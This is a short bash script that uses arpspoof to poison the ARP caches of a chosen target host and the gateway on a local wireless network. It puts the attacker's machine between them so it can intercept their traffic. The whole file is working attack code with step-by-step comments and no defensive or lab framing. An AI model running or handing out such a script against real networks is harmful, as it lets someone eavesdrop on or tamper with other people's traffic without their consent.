#!/bin/bash

# Define your network interface and gateway IP
INTERFACE="wlan0"
GATEWAY="192.168.0.1"
TARGET="192.168.0.149"  # Target IP address

# Perform ARP spoofing to poison both the target and the gateway
echo "Starting ARP Spoofing for target $TARGET..."

# Poison the target's ARP cache (make the target think your machine is the gateway)
sudo arpspoof -i $INTERFACE -t $TARGET $GATEWAY &

# Poison the gateway's ARP cache (make the gateway think your machine is the target)
sudo arpspoof -i $INTERFACE -t $GATEWAY $TARGET &

# Wait for all background processes to finish
wait

echo "ARP Spoofing completed."
